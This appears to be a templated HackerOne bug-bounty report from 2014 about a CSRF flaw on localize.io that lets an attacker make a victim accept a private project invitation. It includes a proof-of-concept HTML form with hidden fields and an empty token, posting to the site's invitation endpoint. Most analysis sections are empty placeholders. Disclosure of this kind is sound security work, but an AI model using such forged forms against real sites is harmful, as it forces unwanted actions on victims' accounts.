#  Private Project Access Request Accpeted Via CSRF 

## Metadata
- **Source:** HackerOne
- **Report:** 8224 | https://hackerone.com/reports/8224
- **Submitted:** 2014-04-20
- **Reporter:** ajaysinghnegi
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hi Team,

I have found a CSRF vulnerability using which the attacker can force the victim to Accpeted the private project access invitation request Via CSRF as the anti-csrf token is not getting validated on the server-side. 


Private Project Access Request Accpeted Via CSRF Code:

<html>
<html>
  <body>
    <form action="http://www.localize.io/invitations/9l" method="POST">
      <inp

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi Team,

I have found a CSRF vulnerability using which the attacker can force the victim to Accpeted the private project access invitation request Via CSRF as the anti-csrf token is not getting validated on the server-side. 


Private Project Access Request Accpeted Via CSRF Code:

<html>
<html>
  <body>
    <form action="http://www.localize.io/invitations/9l" method="POST">
      <input type="hidden" name="CSRFToken" value="" />
      <input type="hidden" name="invitations[userID]" value="3gh" />
      <input type="hidden" name="invitations[accept]" value="-1" />
      <input type="hidden" name="invitations[role]" value="4" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>

</details>

---
*Analysed by Claude on 2026-05-24*
